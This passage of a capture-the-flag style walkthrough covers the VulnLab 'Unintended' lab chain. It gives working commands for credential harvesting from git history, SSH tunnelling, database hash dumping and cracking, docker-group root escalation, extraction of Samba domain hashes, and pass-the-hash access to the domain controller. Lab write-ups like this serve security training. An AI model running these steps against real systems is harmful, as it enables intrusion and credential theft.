+<h3 id="Repository-Analysis-DevOps-Repo"><a href="#Repository-Analysis-DevOps-Repo" class="headerlink" title="Repository Analysis - DevOps Repo"></a>Repository Analysis - DevOps Repo</h3><p>Examining commit history in the <code>juan/DevOps</code> repository yields multiple sensitive findings:</p>
+<p><strong>1. SSH Public Keys Discovery</strong><br>Found SSH keys for:</p>
+<ul>
+<li><code>ratul@devops</code></li>
+<li><code>nanee@devops</code></li>
+</ul>
+<p><strong>2. MySQL Database Credentials</strong><br>Commit: <code>http://code.unintended.vl/juan/DevOps/commit/7c54501b040a15a0e57beade1c8910609ec7c785</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FROM mysql:latest</span><br><span class="line">ENV MYSQL_ROOT_PASSWORD=root</span><br><span class="line">ENV MYSQL_DATABASE=wp_db</span><br><span class="line">ENV MYSQL_USER=wp_user</span><br><span class="line">ENV MYSQL_PASSWORD=&lt;REDACTED&gt;</span><br><span class="line">EXPOSE 3306</span><br></pre></td></tr></table></figure>
+
+<p>While these credentials may not grant immediate access, they reveal the organization’s password complexity policy - a crucial finding for future password spraying attacks.</p>
+<p><strong>3. FTP Credentials (Deleted)</strong><br>Commit: <code>http://code.unintended.vl/juan/DevOps/commit/75f1f713696016f7713e33f836b05ce14784fc22</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ENV APP_SECRET 6SU28SH286DY8HS7D</span><br><span class="line">ENV SFTP_USER ftp_user</span><br><span class="line">ENV SFTP_PASS &lt;REDACTED&gt;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="SFTP-Access-and-Tunneling"><a href="#SFTP-Access-and-Tunneling" class="headerlink" title="SFTP Access and Tunneling"></a>SFTP Access and Tunneling</h2><h3 id="Initial-SFTP-Connection"><a href="#Initial-SFTP-Connection" class="headerlink" title="Initial SFTP Connection"></a>Initial SFTP Connection</h3><p>Attempting SSH authentication with discovered credentials:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh ftp_user@10.10.231.230</span><br></pre></td></tr></table></figure>
+
+<p>Returns: <code>This service allows sftp connections only.</code></p>
+<p>Connecting via SFTP:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sftp ftp_user@10.10.231.230</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unintended/shh-sftp.png" alt="SFTP connection established"></p>
+<p>The SFTP directory appears empty initially, but we can leverage this access for network pivoting.</p>
+<h3 id="SSH-Dynamic-Port-Forwarding"><a href="#SSH-Dynamic-Port-Forwarding" class="headerlink" title="SSH Dynamic Port Forwarding"></a>SSH Dynamic Port Forwarding</h3><p>Using SFTP credentials to establish a SOCKS proxy:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 1080 -N ftp_user@10.10.231.230</span><br></pre></td></tr></table></figure>
+
+<p><strong>ProxyChains Configuration:</strong><br>Edit <code>/etc/proxychains4.conf</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks4 127.0.0.1 1080</span><br></pre></td></tr></table></figure>
+
+<p><strong>Important:</strong> Use <code>proxychains4</code> specifically to avoid system instability.</p>
+<h3 id="Internal-Network-Scanning"><a href="#Internal-Network-Scanning" class="headerlink" title="Internal Network Scanning"></a>Internal Network Scanning</h3><p>Scanning localhost through the tunnel to discover internal services:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sT -Pn -4 -n \</span><br><span class="line">  --min-parallelism 1 --max-parallelism 5 --scan-delay 50ms \</span><br><span class="line">  127.0.0.1 -p-</span><br></pre></td></tr></table></figure>
+
+<p><strong>Discovered Internal Ports:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">222/tcp   open  rsh-spx</span><br><span class="line">3000/tcp  open  ppp</span><br><span class="line">3306/tcp  open  mysql</span><br><span class="line">8000/tcp  open  http-alt</span><br><span class="line">8065/tcp  open  unknown</span><br><span class="line">8200/tcp  open  trivnet1</span><br><span class="line">42603/tcp open  unknown</span><br><span class="line">58050/tcp open  unknown</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="MySQL-Database-Exploitation"><a href="#MySQL-Database-Exploitation" class="headerlink" title="MySQL Database Exploitation"></a>MySQL Database Exploitation</h2><h3 id="Database-Access"><a href="#Database-Access" class="headerlink" title="Database Access"></a>Database Access</h3><p>Using previously discovered MySQL credentials:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 mysql -h 127.0.0.1 -u root -p</span><br></pre></td></tr></table></figure>
+
+<p><strong>Available Databases:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MySQL [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| gitea              |</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure>
+
+<h3 id="Gitea-User-Credential-Extraction"><a href="#Gitea-User-Credential-Extraction" class="headerlink" title="Gitea User Credential Extraction"></a>Gitea User Credential Extraction</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use gitea;</span><br><span class="line">show tables;</span><br></pre></td></tr></table></figure>
+
+<p>Extracting user credentials:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select email,passwd,passwd_hash_algo,salt,is_admin from user;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unintended/mysql-stuff.png" alt="MySQL user table dump"></p>
+<h3 id="Hash-Cracking"><a href="#Hash-Cracking" class="headerlink" title="Hash Cracking"></a>Hash Cracking</h3><p><strong>Hash Format:</strong> The hashes require reformatting to:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha256:&lt;iterations&gt;:&lt;base64_salt&gt;:&lt;base64_hash&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Base64 Encoding Process:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;6f7cf4aa34-----------f9f7ca342fa5&#x27; | xxd -r -p | base64</span><br><span class="line">echo &#x27;f57a3d5d199ac9999999996fe7b0-------------78c1dbbe902&#x27; | xxd -r -p | base64</span><br></pre></td></tr></table></figure>
+
+<p><strong>Formatted Hash Example:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha256:50000:b3z0qjT+uSIJLvn3yjQvpQ==:9Xo9XRm-----------------------------</span><br></pre></td></tr></table></figure>
+
+<p><strong>Cracking Result:</strong></p>
+<ul>
+<li><strong>Administrator password successfully cracked</strong></li>
+<li><strong>Juan’s password:</strong> Failed to crack</li>
+</ul>
+<h3 id="Credentials-Found"><a href="#Credentials-Found" class="headerlink" title="Credentials Found:"></a>Credentials Found:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">administrator:loveandhate (Gitea Admin)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Gitea-Administrator-Access"><a href="#Gitea-Administrator-Access" class="headerlink" title="Gitea Administrator Access"></a>Gitea Administrator Access</h2><h3 id="Home-Backup-Repository"><a href="#Home-Backup-Repository" class="headerlink" title="Home Backup Repository"></a>Home Backup Repository</h3><p>Logging into Gitea as administrator reveals a new repository: <code>home-backup</code></p>
+<p>This repository contains a backup of user Juan’s home directory. Examining <code>.bash_history</code>:</p>
+<p><img src="/images/Unintended/Vlid-pass-juan.png" alt="Valid credentials in bash history"></p>
+<p><strong>Credentials Obtained:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">juan:&lt;REDACTED&gt;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="LDAP-Enumeration-with-Valid-Credentials"><a href="#LDAP-Enumeration-with-Valid-Credentials" class="headerlink" title="LDAP Enumeration with Valid Credentials"></a>LDAP Enumeration with Valid Credentials</h2><p>Now with valid domain credentials, we can perform deeper enumeration:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap dc -u &#x27;juan&#x27; -p &#x27;&lt;REDACTED&gt;&#x27; --query &quot;(sAMAccountName=juan)&quot; &quot;&quot;</span><br><span class="line">netexec ldap dc -u &#x27;juan&#x27; -p &#x27;&lt;REDACTED&gt;&#x27; --query &quot;(sAMAccountName=abbie)&quot; &quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Group Memberships:</strong></p>
+<ul>
+<li><code>juan</code> → Member of <strong>Web Developers</strong> group</li>
+<li><code>abbie</code> → Member of <strong>Backup Operators</strong> group</li>
+</ul>
+<h3 id="Computer-Enumeration"><a href="#Computer-Enumeration" class="headerlink" title="Computer Enumeration"></a>Computer Enumeration</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap dc -u &#x27;juan&#x27; -p &#x27;&lt;REDACTED&gt;&#x27; --query &quot;(objectCategory=computer)&quot; &quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Computer Accounts and SPNs:</strong></p>
+<p><strong>BACKUP Computer:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dNSHostName: backup.unintended.vl</span><br><span class="line">servicePrincipalName:</span><br><span class="line">    host/BACKUP</span><br><span class="line">    host/backup.unintended.vl</span><br><span class="line">    RestrictedKrbHost/BACKUP</span><br><span class="line">    RestrictedKrbHost/backup.unintended.vl</span><br></pre></td></tr></table></figure>
+
+<p><strong>WEB Computer:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dNSHostName: web.unintended.vl</span><br><span class="line">servicePrincipalName:</span><br><span class="line">    host/WEB</span><br><span class="line">    host/web.unintended.vl</span><br><span class="line">    RestrictedKrbHost/WEB</span><br><span class="line">    RestrictedKrbHost/web.unintended.vl</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Lateral-Movement-Web-Server"><a href="#Lateral-Movement-Web-Server" class="headerlink" title="Lateral Movement - Web Server"></a>Lateral Movement - Web Server</h2><h3 id="SSH-Access-as-Juan"><a href="#SSH-Access-as-Juan" class="headerlink" title="SSH Access as Juan"></a>SSH Access as Juan</h3><p>Given Juan’s membership in the <strong>Web Developers</strong> group:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -l juan@unintended.vl web.unintended.vl</span><br></pre></td></tr></table></figure>
+
+<p><strong>Success!</strong> We now have shell access to the web server.</p>
+<h3 id="Initial-Host-Enumeration"><a href="#Initial-Host-Enumeration" class="headerlink" title="Initial Host Enumeration"></a>Initial Host Enumeration</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">juan@unintended.vl@web://home$ ls</span><br><span class="line">abbie@unintended.vl  administrator@unintended.vl  juan@unintended.vl  svc</span><br></pre></td></tr></table></figure>
+
+<p><strong>Observations:</strong></p>
+<ul>
+<li><code>svc</code> user exists locally (not a domain account)</li>
+<li>No sudo privileges for juan</li>
+<li>Standard privilege escalation paths unsuccessful</li>
+</ul>
+<hr>
+<h2 id="Mattermost-Access-and-Intelligence-Gathering"><a href="#Mattermost-Access-and-Intelligence-Gathering" class="headerlink" title="Mattermost Access and Intelligence Gathering"></a>Mattermost Access and Intelligence Gathering</h2><p>Testing Juan’s credentials against the Mattermost instance (port 8065):</p>
+<p><strong>Success!</strong> Credentials work on Mattermost.</p>
+<h3 id="Chat-Log-Analysis"><a href="#Chat-Log-Analysis" class="headerlink" title="Chat Log Analysis"></a>Chat Log Analysis</h3><p><img src="/images/Unintended/gitea-pass.png" alt="Gitea password hint in chat"></p>
+<p><strong>Critical Intelligence:</strong></p>
+<ul>
+<li>Multiple references to PostgreSQL running on the WEB machine</li>
+<li>Database architecture discussions</li>
+<li>Potential credential reuse patterns</li>
+</ul>
+<h3 id="PostgreSQL-Discovery"><a href="#PostgreSQL-Discovery" class="headerlink" title="PostgreSQL Discovery"></a>PostgreSQL Discovery</h3><p>Confirming PostgreSQL is running in a Docker container:</p>
+<p><img src="/images/Unintended/postrgress-db.png" alt="PostgreSQL in Docker"></p>
+<p><strong>Container Network:</strong> PostgreSQL runs on <code>172.21.0.3:5432</code> (not <code>172.21.0.2</code>)</p>
+<p>Verification:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nc -vz 172.21.0.3 5432</span><br></pre></td></tr></table></figure>
+
+<p>Output:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.21.0.3:5432  ...  OK</span><br><span class="line">Connection to 172.21.0.3 5432 port [tcp/postgresql] succeeded!</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Mattermost-Database-Exploitation"><a href="#Mattermost-Database-Exploitation" class="headerlink" title="Mattermost Database Exploitation"></a>Mattermost Database Exploitation</h2><h3 id="Default-Credential-Research"><a href="#Default-Credential-Research" class="headerlink" title="Default Credential Research"></a>Default Credential Research</h3><p>Consulting Mattermost Docker documentation:<br><a target="_blank" rel="noopener" href="https://github.com/mattermost/docker/blob/main/env.example">https://github.com/mattermost/docker/blob/main/env.example</a></p>
+<p><img src="/images/Unintended/repo-postgress-default-pass.png" alt="PostgreSQL default credentials"></p>
+<h3 id="Database-Access-1"><a href="#Database-Access-1" class="headerlink" title="Database Access"></a>Database Access</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 psql -h 172.21.0.3 -d mattermost -U mmuser</span><br></pre></td></tr></table></figure>
+
+<h3 id="User-Credential-Extraction"><a href="#User-Credential-Extraction" class="headerlink" title="User Credential Extraction"></a>User Credential Extraction</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username,</span><br><span class="line">       password,</span><br><span class="line">       authdata,</span><br><span class="line">       authservice,</span><br><span class="line">       email,</span><br><span class="line">       nickname,</span><br><span class="line">       firstname,</span><br><span class="line">       lastname,</span><br><span class="line">       roles</span><br><span class="line"><span class="keyword">FROM</span> users;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unintended/postr-hashes.png" alt="PostgreSQL user hashes"></p>
+<p><strong>Extracted Hashes:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$2a$10$XVsJbRoMGb3N-------------------------------------</span><br><span class="line">$2a$10$1LN52Ej8HDk------------------------------</span><br><span class="line">$2a$10$2INgG1HdP0----------------------------------------</span><br></pre></td></tr></table></figure>
+
+<p><strong>Hash Type:</strong> bcrypt [Blowfish 32&#x2F;64 X3]</p>
+<hr>
+<h2 id="Password-Cracking-Custom-Wordlist"><a href="#Password-Cracking-Custom-Wordlist" class="headerlink" title="Password Cracking - Custom Wordlist"></a>Password Cracking - Custom Wordlist</h2><h3 id="Intelligence-Driven-Approach"><a href="#Intelligence-Driven-Approach" class="headerlink" title="Intelligence-Driven Approach"></a>Intelligence-Driven Approach</h3><p>Based on chat log intelligence indicating passwords follow a pattern of <strong>Name + Birth Year</strong>, we create a custom wordlist:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Usernames and year range</span></span><br><span class="line">usernames = [<span class="string">&quot;abbie&quot;</span>, <span class="string">&quot;spencer&quot;</span>, <span class="string">&quot;Abbie&quot;</span>, <span class="string">&quot;Spencer&quot;</span>, <span class="string">&quot;theabbs&quot;</span>]</span><br><span class="line">years = <span class="built_in">range</span>(<span class="number">1950</span>, <span class="number">2021</span>)  <span class="comment"># 1950 to 2020 inclusive</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate wordlist</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;usernames_with_years.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> usernames:</span><br><span class="line">        <span class="keyword">for</span> year <span class="keyword">in</span> years:</span><br><span class="line">            file.write(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span><span class="subst">&#123;year&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;File &#x27;usernames_with_years.txt&#x27; created successfully!&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Hash-Cracking-1"><a href="#Hash-Cracking-1" class="headerlink" title="Hash Cracking"></a>Hash Cracking</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john p_hash --wordlist=./usernames_with_years.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unintended/john-pass.png" alt="John successfully cracks password"></p>
+<p><strong>Cracked Credential:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;RUN THE SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Domain-Credential-Discovery"><a href="#Domain-Credential-Discovery" class="headerlink" title="Domain Credential Discovery"></a>Domain Credential Discovery</h2><h3 id="Mattermost-as-Abbie"><a href="#Mattermost-as-Abbie" class="headerlink" title="Mattermost as Abbie"></a>Mattermost as Abbie</h3><p>Logging into Mattermost as Abbie reveals a private conversation with <code>cadams</code>:</p>
+<p><img src="/images/Unintended/abbie-mattermost.png" alt="Abbie&#39;s domain password"></p>
+<p><strong>Domain Credentials Obtained:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abbie:&lt;REDACTED&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Credential-Validation"><a href="#Credential-Validation" class="headerlink" title="Credential Validation"></a>Credential Validation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb dc -u abbie -p &#x27;&lt;REDACTED&gt;&#x27; --shares</span><br></pre></td></tr></table></figure>
+
+<p><strong>Validation successful!</strong> Abbie has valid domain credentials.</p>
+<hr>
+<h2 id="Privilege-Escalation-Backup-Server"><a href="#Privilege-Escalation-Backup-Server" class="headerlink" title="Privilege Escalation - Backup Server"></a>Privilege Escalation - Backup Server</h2><h3 id="SSH-Access-as-Abbie"><a href="#SSH-Access-as-Abbie" class="headerlink" title="SSH Access as Abbie"></a>SSH Access as Abbie</h3><p>Given Abbie’s membership in <strong>Backup Operators</strong>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -l abbie@unintended.vl backup.unintended.vl</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unintended/abbie-ssh.png" alt="SSH access as Abbie"></p>
+<p><strong>Success!</strong> Shell access obtained on the backup server.</p>
+<h3 id="Docker-Group-Membership"><a href="#Docker-Group-Membership" class="headerlink" title="Docker Group Membership"></a>Docker Group Membership</h3><p>Checking group memberships reveals Abbie is in the <strong>docker</strong> group - a critical privilege escalation vector.</p>
+<p><strong>Reference:</strong> <a target="_blank" rel="noopener" href="https://www.securitum.com/privilege_escalation_through_docker_group_membership_and_sudo_backdoor.html">https://www.securitum.com/privilege_escalation_through_docker_group_membership_and_sudo_backdoor.html</a></p>
+<h3 id="Root-Privilege-Escalation"><a href="#Root-Privilege-Escalation" class="headerlink" title="Root Privilege Escalation"></a>Root Privilege Escalation</h3><p>List available Docker images:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image ls</span><br></pre></td></tr></table></figure>
+
+<p>Execute privileged container:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/mnt --rm -it python:3.11.2-slim chroot /mnt sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unintended/root-backup.png" alt="Root access on backup server"></p>
+<p><strong>Root access achieved!</strong></p>
+<h3 id="FTP-Administrator-Credentials"><a href="#FTP-Administrator-Credentials" class="headerlink" title="FTP Administrator Credentials"></a>FTP Administrator Credentials</h3><p>While exploring the system as root, we discover FTP admin credentials:</p>
+<p><img src="/images/Unintended/frp-admin-pass.png" alt="FTP admin credentials"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Username: ftp_admin</span><br><span class="line">Password: &lt;PASS&gt;</span><br><span class="line">Path: /ftp/volumes/</span><br><span class="line">Permissions: elradfmw</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Domain-Administrator-Compromise"><a href="#Domain-Administrator-Compromise" class="headerlink" title="Domain Administrator Compromise"></a>Domain Administrator Compromise</h2><h3 id="FTP-Backup-Analysis"><a href="#FTP-Backup-Analysis" class="headerlink" title="FTP Backup Analysis"></a>FTP Backup Analysis</h3><p>Connecting to FTP with admin credentials reveals:</p>
+<p><img src="/images/Unintended/backyps-on-ftp.png" alt="Domain backups on FTP"></p>
+<p><strong>Critical Discovery:</strong></p>
+<ul>
+<li>Duplicati backups</li>
+<li>Active Directory domain database backups</li>
+</ul>
+<h3 id="NTDS-dit-Secrets-Extraction"><a href="#NTDS-dit-Secrets-Extraction" class="headerlink" title="NTDS.dit Secrets Extraction"></a>NTDS.dit Secrets Extraction</h3><p><img src="/images/Unintended/secrets-extract.png" alt="Extracting secrets from domain backup"></p>
+<p><strong>Tool Requirements:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install ldb-tools</span><br></pre></td></tr></table></figure>
+
+<p><strong>Extraction Process:</strong></p>
+<p><strong>Reference:</strong><br><a target="_blank" rel="noopener" href="https://samba.tranquil.it/doc/en/samba_fundamentals-about_password_hash.html">https://samba.tranquil.it/doc/en/samba_fundamentals-about_password_hash.html</a></p>
+<p>Extract Administrator hash:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldbsearch -H ./sam.ldb &#x27;(objectClass=user)&#x27; sAMAccountName &#x27;unicodepwd&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>Convert hash format:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import codecs, binascii; print(binascii.hexlify(codecs.decode(b&#x27;&lt;HASH&gt;&#x27;, &#x27;base64&#x27;)).decode())&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Pass-the-Hash-Attack"><a href="#Pass-the-Hash-Attack" class="headerlink" title="Pass-the-Hash Attack"></a>Pass-the-Hash Attack</h3><p>Using the extracted NTLM hash:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient.py unintended.vl/administrator@dc -no-pass -hashes :36fe241ea0eaa----------</span><br></pre></td></tr></table></figure>
+
+<p>Access administrator’s home share:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use home</span><br><span class="line">get root.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>Domain Administrator access achieved!</strong></p>
+<hr>
+<p><strong>Lab Link:</strong><br><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=4f044c96-ae6d-4745-9233-5b6b559a58cf">https://api.vulnlab.com/api/v1/share?id=4f044c96-ae6d-4745-9233-5b6b559a58cf</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Unintended-VulnLab-Chain-Complete-Walkthrough-and-Writeup"><span class="toc-number">1.</span> <span class="toc-text">Unintended VulnLab Chain - Complete Walkthrough and Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Reconnaissance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-DC-10-10-231-229"><span class="toc-number">1.1.1.</span> <span class="toc-text">Nmap Scan - DC (10.10.231.229)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-Web-Server-10-10-231-230"><span class="toc-number">1.1.2.</span> <span class="toc-text">Nmap Scan - Web Server (10.10.231.230)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-Backup-Server-10-10-231-231"><span class="toc-number">1.1.3.</span> <span class="toc-text">Nmap Scan - Backup Server (10.10.231.231)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Active-Directory-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Active Directory Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-Null-Authentication"><span class="toc-number">1.2.1.</span> <span class="toc-text">SMB Null Authentication</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP-Enumeration"><span class="toc-number">1.2.2.</span> <span class="toc-text">LDAP Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AS-REP-Roasting-Attempt"><span class="toc-number">1.2.3.</span> <span class="toc-text">AS-REP Roasting Attempt</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS-Enumeration-Critical-Discovery"><span class="toc-number">1.3.</span> <span class="toc-text">DNS Enumeration - Critical Discovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gitea-Repository-Discovery"><span class="toc-number">1.4.</span> <span class="toc-text">Gitea Repository Discovery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Repository-Analysis-DevOps-Repo"><span class="toc-number">1.4.1.</span> <span 